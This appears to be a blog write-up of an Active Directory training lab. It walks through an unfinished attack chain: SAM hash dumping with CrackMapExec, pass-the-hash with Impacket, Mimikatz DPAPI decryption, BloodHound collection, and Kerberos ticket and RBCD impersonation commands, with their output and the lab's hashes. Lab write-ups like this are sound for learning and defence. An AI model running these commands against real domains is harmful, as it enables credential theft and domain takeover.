---
layout: post
title: "SOKOLO AD lab — Active Directory attack chain"
date: 2026-02-01 12:00:00 +0100
categories: [Active Directory]
tags: [active-directory, bloodhound, impacket, kerberos, pass-the-hash, rbcd]
description: "Active Directory lab progress report covering initial access, SMB enumeration, SAM hash extraction, pass-the-hash, DPAPI investigation, BloodHound review, Kerberos tickets and RBCD attempts."
---

## Lab overview

The SOKOLO lab is an Active Directory environment with one workstation and multiple domain controllers.

| Host | IP | Role |
| --- | --- | --- |
| `WS` | `176.16.35.160` | Workstation |
| `DC` | `176.16.35.133` | Domain Controller |
| `DC1` | `176.16.35.157` | Domain Controller |
| `DC2` | `176.16.35.158` | Domain Controller |
| `DC3` | `176.16.35.159` | Domain Controller |

Domain:

```text
SOKOLO.DOJO
```

Goal:

```text
Retrieve 3 flags
```

## Initial access

The lab provided credentials for the user `SecDojo`.

RDP connection:

```bash
xfreerdp3 /u:SecDojo /p:'Password@2030!#$%' /d:SOKOLO /v:176.16.35.160
```

Credentials:

```text
User: SecDojo
Password: Password@2030!#$%
Domain: SOKOLO
```

Result: access to the workstation `WS` was successful.

## SMB enumeration and SAM dump

Using CrackMapExec, I enumerated SMB and dumped local SAM hashes from the workstation:

```bash
crackmapexec smb 176.16.35.160 -u SecDojo -p 'Password@2030!#$%' --sam
```

Relevant output:

```text
SMB  176.16.35.160 445 WS  [+] SOKOLO\SecDojo:Password@2030!#$%
SMB  176.16.35.160 445 WS  [+] Dumping SAM hashes
Administrator:fa3a14731237b27f0f98a41ecde384ab
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0
```

The local Administrator NTLM hash was:

```text
fa3a14731237b27f0f98a41ecde384ab
```

## Pass-the-hash

I used Impacket to authenticate with the local Administrator hash:

```bash
impacket-wmiexec -hashes :fa3a14731237b27f0f98a41ecde384ab Administrator@176.16.35.160
```

Result:

```text
[*] Authentication successful
[*] Launching semi-interactive shell
```

This provided an administrative shell on the workstation.

## File system enumeration

With local admin access, I enumerated user directories:

```cmd
dir C:\Users
dir C:\Users\Administrator
dir C:\Users\Administrator\AppData
```

The interesting path was:

```text
C:\Users\Administrator\AppData\Local\Microsoft\Credentials\
```

Credential blob:

```text
DFBE70A7E5CC19A398EBF1B96859CE5D
```

Associated DPAPI masterkey:

```text
a46e045e-b169-4b52-bed1-4841ce5fbd64
```

## DPAPI decryption attempt

I attempted to decrypt the credential with Mimikatz:

```text
privilege::debug
token::elevate
dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /unprotect
```

The credential could not be decrypted at this stage. DPAPI often requires the original user password, a usable masterkey, or the correct context for decryption.

## BloodHound enumeration

SharpHound collection:

```cmd
SharpHound.exe -c all
```

BloodHound analysis revealed Resource-Based Constrained Delegation on an object related to:

```text
kali$
```

Relevant attribute:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

This indicated that another machine account may be able to impersonate users to `kali$`.

## Machine account hash

The machine account hash for `WS$` was obtained:

```text
WS$ : f746a11ed8387495c3126e95de95850f
```

## Kerberos ticket request

Using Impacket, I requested a TGT for the machine account:

```bash
impacket-getTGT 'SOKOLO/WS$' -hashes :f746a11ed8387495c3126e95de95850f -dc-ip 176.16.35.133
```

Result:

```text
[*] Getting TGT for user
[*] Saving ticket in WS$.ccache
```

Exporting the ticket:

```bash
export KRB5CCNAME=$(pwd)/WS$.ccache
```

## Kerberos pivot attempt

I then attempted to use the ticket against the domain controller:

```bash
impacket-wmiexec -k -no-pass -dc-ip 176.16.35.133 'SOKOLO/WS$@176.16.35.133'
```

The attempt failed:

```text
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN
```

This indicated an SPN problem. Kerberos expects valid service principal names, usually hostnames or FQDNs, rather than direct IP-based targets.

## RBCD impersonation attempt

I attempted to impersonate Administrator through the RBCD path:

```bash
impacket-getST -spn HOST/kali.SOKOLO.dojo \
  -impersonate Administrator \
  -dc-ip 176.16.35.133 \
  'SOKOLO/WS$' \
  -hashes :f746a11ed8387495c3126e95de95850f
```

The command produced a service ticket:

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HOST_kali.SOKOLO.dojo@SOKOLO.DOJO.ccache
```

I exported it:

```bash
export KRB5CCNAME=$(pwd)/Administrator@HOST_kali.SOKOLO.dojo@SOKOLO.DOJO.ccache
```

Then tested access:

```bash
impacket-wmiexec -k -no-pass SOKOLO/Administrator@176.16.35.160
```

The session did not succeed:

```text
[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED
```

## Current status

Access obtained:

| Item | Status |
| --- | --- |
| `SecDojo` user access | Obtained |
| Local Administrator NTLM hash | Obtained |
| Administrator shell on workstation | Obtained |
| `WS$` machine account hash | Obtained |
| Kerberos ticket | Generated |
| Domain compromise | Not completed |

Flags:

```text
0 / 3
```

## Next steps

The next investigation steps are:

1. Fully validate the RBCD path from `WS$` to `kali$`.
2. Confirm permissions on the `kali$` object in BloodHound.
3. Retry Kerberos access using correct hostnames and FQDNs instead of IP addresses.
4. Recheck SPNs for `HOST`, `CIFS`, `HTTP` or other usable services.
5. Revisit DPAPI decryption with the right masterkey or user context.

## Lessons learned

This lab connected several core Active Directory attack techniques: credential reuse, SAM extraction, pass-the-hash, DPAPI artifact analysis, BloodHound graph review, machine account tickets and RBCD. The incomplete exploitation path is still useful because it shows where Kerberos correctness matters: SPNs, FQDNs, ticket scope and service selection can decide whether an otherwise valid attack path works.
